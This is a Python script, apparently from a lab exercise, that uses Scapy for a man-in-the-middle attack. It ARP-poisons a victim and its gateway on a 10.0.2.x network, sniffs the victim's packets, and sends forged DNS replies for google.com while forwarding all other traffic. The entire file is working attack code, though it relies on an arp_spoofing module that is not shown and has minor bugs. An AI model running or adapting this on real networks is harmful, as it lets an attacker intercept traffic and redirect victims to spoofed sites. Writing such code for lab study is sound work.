from scapy.all import *
from arp_spoofing import *

spoofed_addr = "10.0.2.5"

interface = "enp0s9"
sock = conf.L2socket(iface=interface)

dns_server_ip = "10.0.2.1"
dns_server_mac = "52:54:00:12:35:00"

host_ip_addr = get_if_addr(interface)
host_mac_addr = get_if_hwaddr(interface)

dns_to_spoof={
    b"google.com.":host_ip_addr  
}

def find_gateway_router():
    global dns_server_ip
    global dns_server_mac
    global Target2
    
    gws=conf.route.route("0.0.0.0")[2]
    #print(gws)
    
    dns_server_ip = gws
    dns_server_mac = getmacbyip(gws)

    print("Gateway: " +  dns_server_ip + " " + dns_server_mac)


def dns_spoof(pkt, ip_of_dns):
    print("PKT-------------------------")
    
    spoofed_pkt=pkt.copy()
    qname=pkt[DNSQR].qname
    print("qname: " + qname)
    print("ip_of_dns: " + ip_of_dns)

    spoofed_pkt[Ether].src = pkt[Ether].dst
    spoofed_pkt[Ether].dst = pkt[Ether].src
    spoofed_pkt[IP].src = str(pkt[IP].dst)
    spoofed_pkt[IP].dst = str(pkt[IP].src)
    spoofed_pkt[DNS].an = DNSRR(rrname=qname, rdata=ip_of_dns)
    spoofed_pkt[DNS].ancount = 1
    spoofed_pkt[UDP].sport = pkt[UDP].dport
    spoofed_pkt[UDP].dport = pkt[UDP].sport

    del spoofed_pkt[IP].len
    del spoofed_pkt[IP].chksum
    del spoofed_pkt[UDP].len
    del spoofed_pkt[UDP].chksum
    
    sendp(spoofed_pkt)
    print("Sent")


def forward(pkt):
    pkt[Ether].dst=dns_server_mac

    if pkt.haslayer(IP):
        del pkt[IP].len
        del pkt[IP].chksum

    if pkt.haslayer(UDP):
        del pkt[UDP].len
        del pkt[UDP].chksum

    sock.send(pkt)


def dns_react(pkt):

    if pkt.haslayer(DNS) and dns_to_spoof.has_key(pkt[DNSQR].qname):
        dns_spoof(pkt, spoofed_addr)
    else:
        forward(pkt)

        
        

def main_dns():
    find_gateway_router()

    def arp_spoof_loop(ip, mac, spoofed_ip):
            print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
            i = 0
            while i in range(10):
                arp_spoof(ip, mac, spoofed_ip)
                time.sleep(2)
                i+=1
            print("ARP end -------")

    #gateway
    ip_tgt = "10.0.2.1"
    mac_sp_xp = "08:00:27:a8:31:23"
    spoofed_ip_xp = "10.0.2.4"
    arp_thread_xp = threading.Thread(target=arp_spoof_loop, args=(ip_tgt, mac_sp_xp, spoofed_ip_xp))
    arp_thread_xp.daemon = True
    arp_thread_xp.start()

    #victim
    ip_2 = "10.0.2.4"
    mac_2 = "08:00:27:a8:31:23"
    spoofed_ip_2 = "10.0.2.1"
    arp_thread_xp2 = threading.Thread(target=arp_spoof_loop, args=(ip_2, mac_2, spoofed_ip_2))
    arp_thread_xp2.daemon = True
    arp_thread_xp2.start()

    sniff(store = 0, filter="src host 10.0.2.4", iface = "enp0s9", prn = lambda x: dns_react(x))

main_dns()






